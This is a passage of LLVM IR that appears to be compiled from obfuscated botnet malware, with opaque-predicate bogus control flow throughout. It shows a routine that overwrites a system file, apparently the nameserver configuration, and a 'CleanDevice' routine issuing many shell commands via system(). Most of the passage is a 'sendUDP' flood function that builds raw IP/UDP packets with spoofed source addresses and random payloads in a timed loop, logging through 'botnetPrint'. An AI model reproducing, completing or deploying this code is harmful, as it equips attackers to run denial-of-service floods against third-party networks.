  %25 = call i32 @close(i32 %24)
  store i32 0, i32* %2, align 4
  br label %26

; <label>:26:                                     ; preds = %23, %originalBBpart2
  %27 = load i32, i32* %2, align 4
  ret i32 %27

originalBBalteredBB:                              ; preds = %originalBB, %6
  store i32 1, i32* %2, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @UpdateNameSrvs() #0 {
  %1 = alloca i16, align 2
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.99, i32 0, i32 0), i32 513)
  %5 = trunc i32 %4 to i16
  store i16 %5, i16* %1, align 2
  %6 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.99, i32 0, i32 0), i32 0) #3
  %7 = icmp ne i32 %6, -1
  br i1 %7, label %8, label %32

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* @x.93
  %10 = load i32, i32* @y.94
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %8
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.100, i32 0, i32 0), i8** %2, align 8
  %17 = load i8*, i8** %2, align 8
  %18 = call i64 @strlen(i8* %17) #9
  store i64 %18, i64* %3, align 8
  %19 = load i16, i16* %1, align 2
  %20 = zext i16 %19 to i32
  %21 = load i8*, i8** %2, align 8
  %22 = load i64, i64* %3, align 8
  %23 = call i64 @write(i32 %20, i8* %21, i64 %22)
  %24 = load i32, i32* @x.93
  %25 = load i32, i32* @y.94
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %33

; <label>:32:                                     ; preds = %0
  br label %37

; <label>:33:                                     ; preds = %originalBBpart2
  %34 = load i16, i16* %1, align 2
  %35 = zext i16 %34 to i32
  %36 = call i32 @close(i32 %35)
  br label %37

; <label>:37:                                     ; preds = %33, %32
  %38 = load i32, i32* @x.93
  %39 = load i32, i32* @y.94
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %37
  %46 = load i32, i32* @x.93
  %47 = load i32, i32* @y.94
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %8
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.100, i32 0, i32 0), i8** %2, align 8
  %54 = load i8*, i8** %2, align 8
  %55 = call i64 @strlen(i8* %54) #9
  store i64 %55, i64* %3, align 8
  %56 = load i16, i16* %1, align 2
  %57 = zext i16 %56 to i32
  %58 = load i8*, i8** %2, align 8
  %59 = load i64, i64* %3, align 8
  %60 = call i64 @write(i32 %57, i8* %58, i64 %59)
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %37
  br label %originalBB1
}

declare i32 @open(i8*, i32, ...) #2

; Function Attrs: noinline nounwind uwtable
define void @CleanDevice() #0 {
  %1 = load i32, i32* @x.95
  %2 = load i32, i32* @y.96
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.101, i32 0, i32 0))
  %10 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.102, i32 0, i32 0))
  %11 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.103, i32 0, i32 0))
  %12 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.104, i32 0, i32 0))
  %13 = call i32 @system(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.105, i32 0, i32 0))
  %14 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.106, i32 0, i32 0))
  %15 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.107, i32 0, i32 0))
  %16 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.108, i32 0, i32 0))
  %17 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.109, i32 0, i32 0))
  %18 = call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.110, i32 0, i32 0))
  %19 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.111, i32 0, i32 0))
  %20 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.112, i32 0, i32 0))
  %21 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.113, i32 0, i32 0))
  %22 = load i32, i32* @x.95
  %23 = load i32, i32* @y.96
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %0
  %30 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.101, i32 0, i32 0))
  %31 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.102, i32 0, i32 0))
  %32 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.103, i32 0, i32 0))
  %33 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.104, i32 0, i32 0))
  %34 = call i32 @system(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.105, i32 0, i32 0))
  %35 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.106, i32 0, i32 0))
  %36 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.107, i32 0, i32 0))
  %37 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.108, i32 0, i32 0))
  %38 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.109, i32 0, i32 0))
  %39 = call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.110, i32 0, i32 0))
  %40 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.111, i32 0, i32 0))
  %41 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.112, i32 0, i32 0))
  %42 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.113, i32 0, i32 0))
  br label %originalBB
}

declare i32 @system(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 %7, i32* %16, align 4
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = load i32, i32* %10, align 4
  %36 = icmp eq i32 %35, 0
  br i1 %36, label %37, label %41

; <label>:37:                                     ; preds = %8
  %38 = call i32 @rand_cmwc()
  %39 = trunc i32 %38 to i16
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %39, i16* %40, align 2
  br label %62

; <label>:41:                                     ; preds = %8
  %42 = load i32, i32* @x.97
  %43 = load i32, i32* @y.98
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %41
  %50 = load i32, i32* %10, align 4
  %51 = trunc i32 %50 to i16
  %52 = call zeroext i16 @htons(i16 zeroext %51) #10
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %52, i16* %53, align 2
  %54 = load i32, i32* @x.97
  %55 = load i32, i32* @y.98
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %62

; <label>:62:                                     ; preds = %originalBBpart2, %37
  %63 = load i32, i32* @x.97
  %64 = load i32, i32* @y.98
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %62
  %71 = load i8*, i8** %9, align 8
  %72 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %73 = call i32 @getHost(i8* %71, %struct.in_addr* %72)
  %74 = icmp ne i32 %73, 0
  %75 = load i32, i32* @x.97
  %76 = load i32, i32* @y.98
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %74, label %83, label %84

; <label>:83:                                     ; preds = %originalBBpart24
  br label %559

; <label>:84:                                     ; preds = %originalBBpart24
  %85 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %86 = getelementptr inbounds [8 x i8], [8 x i8]* %85, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %86, i8 0, i64 8, i32 4, i1 false)
  %87 = load i32, i32* %14, align 4
  store i32 %87, i32* %18, align 4
  %88 = load i32, i32* %12, align 4
  %89 = icmp eq i32 %88, 32
  br i1 %89, label %90, label %235

; <label>:90:                                     ; preds = %84
  %91 = call i32 @socket(i32 2, i32 2, i32 17) #3
  store i32 %91, i32* %19, align 4
  %92 = load i32, i32* %19, align 4
  %93 = icmp ne i32 %92, 0
  br i1 %93, label %97, label %94

; <label>:94:                                     ; preds = %90
  %95 = load i32, i32* @switchCommStock, align 4
  %96 = call i32 (i32, i8*, ...) @botnetPrint(i32 %95, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.114, i32 0, i32 0))
  br label %559

; <label>:97:                                     ; preds = %90
  %98 = load i32, i32* @x.97
  %99 = load i32, i32* @y.98
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %97
  %106 = load i32, i32* %13, align 4
  %107 = add nsw i32 %106, 1
  %108 = sext i32 %107 to i64
  %109 = call noalias i8* @malloc(i64 %108) #3
  store i8* %109, i8** %20, align 8
  %110 = load i8*, i8** %20, align 8
  %111 = icmp eq i8* %110, null
  %112 = load i32, i32* @x.97
  %113 = load i32, i32* @y.98
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %111, label %120, label %121

; <label>:120:                                    ; preds = %originalBBpart28
  br label %559

; <label>:121:                                    ; preds = %originalBBpart28
  %122 = load i8*, i8** %20, align 8
  %123 = load i32, i32* %13, align 4
  %124 = add nsw i32 %123, 1
  %125 = sext i32 %124 to i64
  call void @llvm.memset.p0i8.i64(i8* %122, i8 0, i64 %125, i32 1, i1 false)
  %126 = load i8*, i8** %20, align 8
  %127 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %126, i32 %127)
  %128 = call i64 @time(i64* null) #3
  %129 = load i32, i32* %11, align 4
  %130 = sext i32 %129 to i64
  %131 = add nsw i64 %128, %130
  %132 = trunc i64 %131 to i32
  store i32 %132, i32* %21, align 4
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %133

; <label>:133:                                    ; preds = %231, %originalBBpart237, %188, %121
  %134 = load i32, i32* %19, align 4
  %135 = load i8*, i8** %20, align 8
  %136 = load i32, i32* %13, align 4
  %137 = sext i32 %136 to i64
  %138 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %139 = call i64 @sendto(i32 %134, i8* %135, i64 %137, i32 0, %struct.sockaddr* %138, i32 16)
  %140 = load i32, i32* %22, align 4
  %141 = load i32, i32* %18, align 4
  %142 = icmp eq i32 %140, %141
  br i1 %142, label %143, label %189

; <label>:143:                                    ; preds = %133
  %144 = load i32, i32* %10, align 4
  %145 = icmp eq i32 %144, 0
  br i1 %145, label %146, label %150

; <label>:146:                                    ; preds = %143
  %147 = call i32 @rand_cmwc()
  %148 = trunc i32 %147 to i16
  %149 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %148, i16* %149, align 2
  br label %150

; <label>:150:                                    ; preds = %146, %143
  %151 = load i32, i32* @x.97
  %152 = load i32, i32* @y.98
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %150
  %159 = call i64 @time(i64* null) #3
  %160 = load i32, i32* %21, align 4
  %161 = sext i32 %160 to i64
  %162 = icmp sgt i64 %159, %161
  %163 = load i32, i32* @x.97
  %164 = load i32, i32* @y.98
  %165 = sub i32 %163, 1
  %166 = mul i32 %163, %165
  %167 = urem i32 %166, 2
  %168 = icmp eq i32 %167, 0
  %169 = icmp slt i32 %164, 10
  %170 = or i1 %168, %169
  br i1 %170, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %162, label %171, label %188

; <label>:171:                                    ; preds = %originalBBpart212
  %172 = load i32, i32* @x.97
  %173 = load i32, i32* @y.98
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %171
  %180 = load i32, i32* @x.97
  %181 = load i32, i32* @y.98
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %234

; <label>:188:                                    ; preds = %originalBBpart212
  store i32 0, i32* %22, align 4
  br label %133

; <label>:189:                                    ; preds = %133
  %190 = load i32, i32* @x.97
  %191 = load i32, i32* @y.98
  %192 = sub i32 %190, 1
  %193 = mul i32 %190, %192
  %194 = urem i32 %193, 2
  %195 = icmp eq i32 %194, 0
  %196 = icmp slt i32 %191, 10
  %197 = or i1 %195, %196
  br i1 %197, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %189
  %198 = load i32, i32* %22, align 4
  %199 = add i32 %198, 1
  store i32 %199, i32* %22, align 4
  %200 = load i32, i32* %23, align 4
  %201 = load i32, i32* %15, align 4
  %202 = icmp eq i32 %200, %201
  %203 = load i32, i32* @x.97
  %204 = load i32, i32* @y.98
  %205 = sub i32 %203, 1
  %206 = mul i32 %203, %205
  %207 = urem i32 %206, 2
  %208 = icmp eq i32 %207, 0
  %209 = icmp slt i32 %204, 10
  %210 = or i1 %208, %209
  br i1 %210, label %originalBBpart227, label %originalBB18alteredBB

originalBBpart227:                                ; preds = %originalBB18
  br i1 %202, label %211, label %231

; <label>:211:                                    ; preds = %originalBBpart227
  %212 = load i32, i32* @x.97
  %213 = load i32, i32* @y.98
  %214 = sub i32 %212, 1
  %215 = mul i32 %212, %214
  %216 = urem i32 %215, 2
  %217 = icmp eq i32 %216, 0
  %218 = icmp slt i32 %213, 10
  %219 = or i1 %217, %218
  br i1 %219, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %211
  %220 = load i32, i32* %16, align 4
  %221 = mul nsw i32 %220, 1000
  %222 = call i32 @usleep(i32 %221)
  store i32 0, i32* %23, align 4
  %223 = load i32, i32* @x.97
  %224 = load i32, i32* @y.98
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBBpart237, label %originalBB29alteredBB

originalBBpart237:                                ; preds = %originalBB29
  br label %133

; <label>:231:                                    ; preds = %originalBBpart227
  %232 = load i32, i32* %23, align 4
  %233 = add i32 %232, 1
  store i32 %233, i32* %23, align 4
  br label %133

; <label>:234:                                    ; preds = %originalBBpart216
  br label %559

; <label>:235:                                    ; preds = %84
  %236 = call i32 @socket(i32 2, i32 3, i32 17) #3
  store i32 %236, i32* %24, align 4
  %237 = load i32, i32* %24, align 4
  %238 = icmp ne i32 %237, 0
  br i1 %238, label %242, label %239

; <label>:239:                                    ; preds = %235
  %240 = load i32, i32* @switchCommStock, align 4
  %241 = call i32 (i32, i8*, ...) @botnetPrint(i32 %240, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.114, i32 0, i32 0))
  br label %559

; <label>:242:                                    ; preds = %235
  store i32 1, i32* %25, align 4
  %243 = load i32, i32* %24, align 4
  %244 = bitcast i32* %25 to i8*
  %245 = call i32 @setsockopt(i32 %243, i32 0, i32 3, i8* %244, i32 4) #3
  %246 = icmp slt i32 %245, 0
  br i1 %246, label %247, label %250

; <label>:247:                                    ; preds = %242
  %248 = load i32, i32* @switchCommStock, align 4
  %249 = call i32 (i32, i8*, ...) @botnetPrint(i32 %248, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.115, i32 0, i32 0))
  br label %559

; <label>:250:                                    ; preds = %242
  store i32 50, i32* %26, align 4
  br label %251

; <label>:251:                                    ; preds = %255, %250
  %252 = load i32, i32* %26, align 4
  %253 = add nsw i32 %252, -1
  store i32 %253, i32* %26, align 4
  %254 = icmp ne i32 %252, 0
  br i1 %254, label %255, label %262

; <label>:255:                                    ; preds = %251
  %256 = call i64 @time(i64* null) #3
  %257 = call i32 @rand_cmwc()
  %258 = zext i32 %257 to i64
  %259 = xor i64 %256, %258
  %260 = trunc i64 %259 to i32
  call void @srand(i32 %260) #3
  %261 = call i32 @rand() #3
  call void @init_rand(i32 %261)
  br label %251

; <label>:262:                                    ; preds = %251
  %263 = load i32, i32* @x.97
  %264 = load i32, i32* @y.98
  %265 = sub i32 %263, 1
  %266 = mul i32 %263, %265
  %267 = urem i32 %266, 2
  %268 = icmp eq i32 %267, 0
  %269 = icmp slt i32 %264, 10
  %270 = or i1 %268, %269
  br i1 %270, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %262
  %271 = load i32, i32* %12, align 4
  %272 = icmp eq i32 %271, 0
  %273 = load i32, i32* @x.97
  %274 = load i32, i32* @y.98
  %275 = sub i32 %273, 1
  %276 = mul i32 %273, %275
  %277 = urem i32 %276, 2
  %278 = icmp eq i32 %277, 0
  %279 = icmp slt i32 %274, 10
  %280 = or i1 %278, %279
  br i1 %280, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  br i1 %272, label %281, label %298

; <label>:281:                                    ; preds = %originalBBpart241
  %282 = load i32, i32* @x.97
  %283 = load i32, i32* @y.98
  %284 = sub i32 %282, 1
  %285 = mul i32 %282, %284
  %286 = urem i32 %285, 2
  %287 = icmp eq i32 %286, 0
  %288 = icmp slt i32 %283, 10
  %289 = or i1 %287, %288
  br i1 %289, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %281
  store i32 0, i32* %27, align 4
  %290 = load i32, i32* @x.97
  %291 = load i32, i32* @y.98
  %292 = sub i32 %290, 1
  %293 = mul i32 %290, %292
  %294 = urem i32 %293, 2
  %295 = icmp eq i32 %294, 0
  %296 = icmp slt i32 %291, 10
  %297 = or i1 %295, %296
  br i1 %297, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br label %320

; <label>:298:                                    ; preds = %originalBBpart241
  %299 = load i32, i32* @x.97
  %300 = load i32, i32* @y.98
  %301 = sub i32 %299, 1
  %302 = mul i32 %299, %301
  %303 = urem i32 %302, 2
  %304 = icmp eq i32 %303, 0
  %305 = icmp slt i32 %300, 10
  %306 = or i1 %304, %305
  br i1 %306, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %298
  %307 = load i32, i32* %12, align 4
  %308 = sub nsw i32 32, %307
  %309 = shl i32 1, %308
  %310 = sub nsw i32 %309, 1
  %311 = xor i32 %310, -1
  store i32 %311, i32* %27, align 4
  %312 = load i32, i32* @x.97
  %313 = load i32, i32* @y.98
  %314 = sub i32 %312, 1
  %315 = mul i32 %312, %314
  %316 = urem i32 %315, 2
  %317 = icmp eq i32 %316, 0
  %318 = icmp slt i32 %313, 10
  %319 = or i1 %317, %318
  br i1 %319, label %originalBBpart266, label %originalBB47alteredBB

originalBBpart266:                                ; preds = %originalBB47
  br label %320

; <label>:320:                                    ; preds = %originalBBpart266, %originalBBpart245
  %321 = load i32, i32* %13, align 4
  %322 = sext i32 %321 to i64
  %323 = add i64 28, %322
  %324 = call i8* @llvm.stacksave()
  store i8* %324, i8** %28, align 8
  %325 = alloca i8, i64 %323, align 16
  %326 = bitcast i8* %325 to %struct.iphdr*
  store %struct.iphdr* %326, %struct.iphdr** %29, align 8
  %327 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %328 = bitcast %struct.iphdr* %327 to i8*
  %329 = getelementptr i8, i8* %328, i64 20
  %330 = bitcast i8* %329 to %struct.udphdr*
  store %struct.udphdr* %330, %struct.udphdr** %30, align 8
  %331 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %332 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %333 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %332, i32 0, i32 0
  %334 = load i32, i32* %333, align 4
  %335 = load i32, i32* %27, align 4
  %336 = call i32 @GRIP(i32 %335)
  %337 = call i32 @htonl(i32 %336) #10
  %338 = load i32, i32* %13, align 4
  %339 = sext i32 %338 to i64
  %340 = add i64 8, %339
  %341 = trunc i64 %340 to i32
  call void @makeIPPacket(%struct.iphdr* %331, i32 %334, i32 %337, i8 zeroext 17, i32 %341)
  %342 = load i32, i32* %13, align 4
  %343 = sext i32 %342 to i64
  %344 = add i64 8, %343
  %345 = trunc i64 %344 to i16
  %346 = call zeroext i16 @htons(i16 zeroext %345) #10
  %347 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %348 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %347, i32 0, i32 0
  %349 = bitcast %union.anon.1* %348 to %struct.anon.2*
  %350 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %349, i32 0, i32 2
  store i16 %346, i16* %350, align 2
  %351 = call i32 @rand_cmwc()
  %352 = trunc i32 %351 to i16
  %353 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %354 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %353, i32 0, i32 0
  %355 = bitcast %union.anon.1* %354 to %struct.anon.2*
  %356 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %355, i32 0, i32 0
  store i16 %352, i16* %356, align 2
  %357 = load i32, i32* %10, align 4
  %358 = icmp eq i32 %357, 0
  br i1 %358, label %359, label %377

; <label>:359:                                    ; preds = %320
  %360 = load i32, i32* @x.97
  %361 = load i32, i32* @y.98
  %362 = sub i32 %360, 1
  %363 = mul i32 %360, %362
  %364 = urem i32 %363, 2
  %365 = icmp eq i32 %364, 0
  %366 = icmp slt i32 %361, 10
  %367 = or i1 %365, %366
  br i1 %367, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %359
  %368 = call i32 @rand_cmwc()
  %369 = load i32, i32* @x.97
  %370 = load i32, i32* @y.98
  %371 = sub i32 %369, 1
  %372 = mul i32 %369, %371
  %373 = urem i32 %372, 2
  %374 = icmp eq i32 %373, 0
  %375 = icmp slt i32 %370, 10
  %376 = or i1 %374, %375
  br i1 %376, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br label %398

; <label>:377:                                    ; preds = %320
  %378 = load i32, i32* @x.97
  %379 = load i32, i32* @y.98
  %380 = sub i32 %378, 1
  %381 = mul i32 %378, %380
  %382 = urem i32 %381, 2
  %383 = icmp eq i32 %382, 0
  %384 = icmp slt i32 %379, 10
  %385 = or i1 %383, %384
  br i1 %385, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %377
  %386 = load i32, i32* %10, align 4
  %387 = trunc i32 %386 to i16
  %388 = call zeroext i16 @htons(i16 zeroext %387) #10
  %389 = zext i16 %388 to i32
  %390 = load i32, i32* @x.97
  %391 = load i32, i32* @y.98
  %392 = sub i32 %390, 1
  %393 = mul i32 %390, %392
  %394 = urem i32 %393, 2
  %395 = icmp eq i32 %394, 0
  %396 = icmp slt i32 %391, 10
  %397 = or i1 %395, %396
  br i1 %397, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br label %398

; <label>:398:                                    ; preds = %originalBBpart274, %originalBBpart270
  %399 = phi i32 [ %368, %originalBBpart270 ], [ %389, %originalBBpart274 ]
  %400 = load i32, i32* @x.97
  %401 = load i32, i32* @y.98
  %402 = sub i32 %400, 1
  %403 = mul i32 %400, %402
  %404 = urem i32 %403, 2
  %405 = icmp eq i32 %404, 0
  %406 = icmp slt i32 %401, 10
  %407 = or i1 %405, %406
  br i1 %407, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %398
  %408 = trunc i32 %399 to i16
  %409 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %410 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %409, i32 0, i32 0
  %411 = bitcast %union.anon.1* %410 to %struct.anon.2*
  %412 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %411, i32 0, i32 1
  store i16 %408, i16* %412, align 2
  %413 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %414 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %413, i32 0, i32 0
  %415 = bitcast %union.anon.1* %414 to %struct.anon.2*
  %416 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %415, i32 0, i32 3
  store i16 0, i16* %416, align 2
  %417 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %418 = bitcast %struct.udphdr* %417 to i8*
  %419 = getelementptr inbounds i8, i8* %418, i64 8
  %420 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %419, i32 %420)
  %421 = bitcast i8* %325 to i16*
  %422 = load %struct.iphdr*, %struct.iphdr** %29, align 8
